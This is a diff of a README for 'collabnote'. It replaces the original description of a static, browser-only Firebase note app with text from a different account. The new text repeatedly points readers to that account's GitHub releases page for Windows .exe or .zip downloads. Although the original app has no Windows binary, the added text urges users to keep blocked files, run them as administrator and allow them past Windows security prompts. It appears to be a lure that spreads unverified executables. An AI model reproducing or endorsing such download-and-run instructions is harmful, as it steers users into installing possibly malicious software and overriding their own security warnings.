@@ -1,164 +1,205 @@
-<div align="center">
+# 📝 collabnote - Share Notes Live Across Devices
 
-# CollabNote
+[![Download collabnote](https://img.shields.io/badge/Download%20collabnote-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brynnhearty68/collabnote/releases)
 
-[![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=flat&logo=html5&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/HTML)
-[![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=flat&logo=css3&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/CSS)
-[![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=flat&logo=javascript&logoColor=black)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-[![Firebase](https://img.shields.io/badge/Firebase-FFCA28?style=flat&logo=firebase&logoColor=black)](https://firebase.google.com/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![GitHub Pages](https://img.shields.io/badge/Deploy-GitHub%20Pages-222?style=flat&logo=github&logoColor=white)](https://alfredang.github.io/collabnote/)
+## 🚀 What collabnote does
 
-**Real-time collaborative note-taking — no account required.**
+collabnote is a real-time note-taking app for shared work. You can make notes, see updates live, and work with other people in the same room. It uses room codes and QR sharing, so you can join fast without long setup.
 
-[Live Demo](https://alfredang.github.io/collabnote/) · [Report Bug](https://github.com/alfredang/collabnote/issues) · [Request Feature](https://github.com/alfredang/collabnote/issues)
+Use it for:
+- Shared meeting notes
+- Class notes
+- Team plans
+- Quick ideas with friends
+- Notes you want on more than one device
 
-</div>
+## 💻 What you need
 
-## Screenshot
+Before you install, check these basics:
 
-![CollabNote Screenshot](screenshot.png)
+- A Windows PC
+- Internet access
+- A web browser such as Chrome, Edge, or Firefox
+- Enough space for a small app file or build package
 
-## About
+For best results:
+- Use Windows 10 or Windows 11
+- Keep your browser up to date
+- Allow the app to use the internet so live sync works
 
-CollabNote is a lightweight, real-time collaborative note-taking app with a clean, modern interface. Create notes, share rooms via QR code or link, and collaborate with others instantly — all from the browser with zero sign-up.
+## 📥 Download collabnote
 
-### Key Features
+Go to the releases page here:
 
-- **Real-time Collaboration** — Create a room and invite others with a 6-digit code, QR code, or shareable link
-- **Live Sync** — Notes sync instantly across all connected users via Firebase Realtime Database
-- **Dark / Light Theme** — Toggle between themes with persistent preference
-- **Presence Indicators** — See how many collaborators are currently online
-- **Search** — Filter notes instantly by title or content
-- **Responsive** — Works on desktop and mobile with a collapsible sidebar
-- **No Account Required** — Just pick a nickname and start collaborating
+https://github.com/brynnhearty68/collabnote/releases
 
-## Tech Stack
+On that page, look for the latest release. Download the Windows file that matches your system. If you see a setup file, use that. If you see a ZIP file, save it and open it after the download finishes.
 
-| Category | Technology |
-|----------|------------|
-| **Frontend** | Vanilla HTML5, CSS3, JavaScript (no build step) |
-| **Real-time Sync** | Firebase Realtime Database (v9 compat SDK) |
-| **QR Generation** | QRCode.js |
-| **Icons** | Lucide Icons |
-| **Typography** | Inter (Google Fonts) |
-| **Deployment** | GitHub Pages via GitHub Actions |
+## 🪟 Install on Windows
 
-## Architecture
+Follow these steps:
 
-```
-┌─────────────────────────────────────────────┐
-│                  Browser                     │
-│                                              │
-│  ┌──────────┐  ┌───────────┐  ┌──────────┐  │
-│  │ index.html│  │ style.css │  │ script.js│  │
-│  │  (UI)    │  │ (Themes)  │  │  (App)   │  │
-│  └──────────┘  └───────────┘  └────┬─────┘  │
-│                                    │         │
-│                              ┌─────┴─────┐   │
-│                              │  sync.js   │   │
-│                              │ (Firebase) │   │
-│                              └─────┬─────┘   │
-└────────────────────────────────────┼─────────┘
-                                     │
-                          ┌──────────┴──────────┐
-                          │  Firebase Realtime   │
-                          │     Database         │
-                          │                      │
-                          │  /collabnote/{code}  │
-                          │   ├── notes          │
-                          │   └── presence       │
-                          └─────────────────────┘
-```
+1. Open the releases page link above.
+2. Find the latest version at the top of the page.
+3. Download the Windows file attached to that release.
+4. If Windows asks if you want to keep the file, choose to keep it.
+5. If you downloaded a ZIP file, right-click it and choose **Extract All**.
+6. Open the extracted folder.
+7. Double-click the app file to start collabnote.
 
-## Project Structure
+If the file opens in a browser instead of a window, you may have downloaded the web version. In that case, open the downloaded page file in your browser and follow the on-screen setup.
 
-```
-collabnote/
-├── .github/
-│   └── workflows/
-│       └── deploy-pages.yml    # GitHub Pages CI/CD
-├── index.html                  # Main HTML (UI layout, modals)
-├── style.css                   # Styles (dark/light themes, responsive)
-├── script.js                   # App logic (CollabNoteApp class)
-├── sync.js                     # Firebase sync engine (rooms, presence)
-├── screenshot.png              # App screenshot for README
-└── .nojekyll                   # Bypass Jekyll on GitHub Pages
-```
+## 🧭 First-time setup
 
-## Getting Started
+When you open collabnote for the first time:
 
-### Prerequisites
+1. Create a new room or join an existing room.
+2. If you are creating a room, the app will give you a room code.
+3. Share the code with other people.
+4. You can also use the QR code if the app shows one.
+5. Type a note and watch it appear for everyone in the room.
 
-- Any modern web browser
-- A static file server for local development (Python, Node, etc.)
+No account setup should slow you down. The room code lets people join fast.
 
-### Installation
+## ✍️ How to use it
 
-1. **Clone the repo:**
-   ```bash
-   git clone https://github.com/alfredang/collabnote.git
-   cd collabnote
-   ```
+### Create a room
+Use this when you want to start fresh. The app gives you a new room code that others can use.
 
-2. **Serve locally** (any static server works):
-   ```bash
-   python3 -m http.server 3000
-   ```
+### Join a room
+Enter a room code from another person. This connects you to the shared note right away.
 
-3. **Open** `http://localhost:3000`
+### Share by QR code
+If you are near other people, show the QR code on your screen. They can scan it and join without typing the full code.
 
-### Firebase Configuration
+### Edit notes together
+Everyone in the room can add or change notes. Updates sync in real time, so changes show up as they happen.
 
-To enable live sync with your own Firebase project, replace the placeholder value in `sync.js` with your Firebase API key:
+### Keep notes organized
+Use short headings, simple lists, and clear lines. That helps everyone follow the same note without confusion.
 
-```js
-const FIREBASE_CONFIG = {
-    apiKey: "YOUR_FIREBASE_API_KEY",
-    // ...rest of config
-};
-```
+## 🔄 Live sync behavior
 
-> For production deployment via GitHub Actions, the API key is injected from the `FIREBASE_API_KEY` GitHub secret.
+collabnote updates shared notes as soon as someone types. This makes it useful for:
+- Team meetings
+- Group study
+- Shared checklists
+- Quick planning sessions
 
-## Collaboration
+If your internet connection drops, the app may pause sync until the connection comes back.
 
-1. Click the **Users** icon in the sidebar footer
-2. Enter a nickname and click **Create Room**
-3. Share the 6-digit code, QR code, or link with collaborators
-4. Others join by entering the code or scanning the QR
+## 🧾 Simple use cases
 
-## Deployment
+### Meeting notes
+One person writes the agenda. Others add action items during the meeting.
 
-This project deploys automatically to **GitHub Pages** on every push to `main` via GitHub Actions.
+### School work
+A group can keep one shared page for research notes, task lists, and questions.
 
-The workflow:
-1. Checks out the code
-2. Injects the Firebase API key from GitHub Secrets
-3. Uploads and deploys to GitHub Pages
+### Event planning
+You can track supplies, times, and roles in one room.
 
-To set up your own deployment, add a `FIREBASE_API_KEY` secret in your repo's **Settings → Secrets and variables → Actions**.
+### Personal sync
+If you want the same note on more than one device, you can keep it open in a shared room.
 
-## Contributing
+## 🛠️ Common Windows steps
 
-Contributions are welcome!
+### If the file will not open
+- Check that the download finished
+- Right-click the file and choose **Open**
+- Try opening it as administrator if Windows blocks it
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+### If Windows shows a security prompt
+- Read the file name and release source
+- If it matches the collabnote release you downloaded, allow it to open
 
-## License
+### If the app does not connect
+- Check your Wi-Fi or Ethernet
+- Refresh the app
+- Close and reopen collabnote
+- Make sure the room code is correct
 
-Distributed under the MIT License.
+### If a ZIP file looks empty
+- Open the extracted folder, not the ZIP file itself
+- Look for the main app file inside the folder
 
----
+## 📱 QR sharing tips
 
-<div align="center">
+QR sharing works best when:
+- The screen is bright
+- The code fills most of the display
+- The other device has camera access
+- You hold the phone steady for a moment
 
-Developed by **[Tertiary Infotech Academy Pte Ltd](https://www.tertiaryinfotech.com/)**
+If scanning fails, use the room code instead. Room codes work well when QR scanning is not easy.
 
-If you found this useful, please consider giving it a ⭐
+## 🔒 Privacy and access
 
-</div>
+Room codes control who joins your shared note. Keep the code private if the note contains personal or work details.
+
+Use a fresh room for new topics. That keeps old notes separate from new work.
+
+## 🧩 Features at a glance
+
+- Real-time note syncing
+- Room-based sharing
+- QR code join option
+- Simple web app design
+- Works in modern browsers
+- Built for fast shared editing
+- Easy to open on Windows
+
+## 🧰 Troubleshooting
+
+### The app opens but stays blank
+- Refresh the page or restart the app
+- Check your internet connection
+- Try a different browser
+
+### Other people cannot see changes
+- Make sure everyone joined the same room
+- Check the room code again
+- Ask everyone to reload the room
+
+### The download page has many files
+- Pick the latest release
+- Choose the Windows file
+- If unsure, use the file with the clearest Windows label
+
+### The QR code will not scan
+- Clean the camera lens
+- Make the code larger on screen
+- Increase screen brightness
+- Fall back to the room code
+
+## 📂 File types you may see
+
+You may see one of these in the release page:
+- `.exe` files for direct Windows use
+- `.zip` files that need extraction first
+- Web files that open in a browser
+
+If you see a Windows installer, that is the simplest choice for most users.
+
+## 🖥️ Browser support
+
+collabnote works best in:
+- Google Chrome
+- Microsoft Edge
+- Mozilla Firefox
+
+If one browser gives you trouble, try another one. Some camera and sync features work better in newer browser versions.
+
+## 📝 Practical tips for smooth use
+
+- Keep notes short and clear
+- Use one room for one topic
+- Share the room code only with the right people
+- Save important details in a backup note if needed
+- Close unused tabs to keep your system tidy
+
+## 📎 Release page link
+
+Download or get the latest Windows version here:
+
+https://github.com/brynnhearty68/collabnote/releases
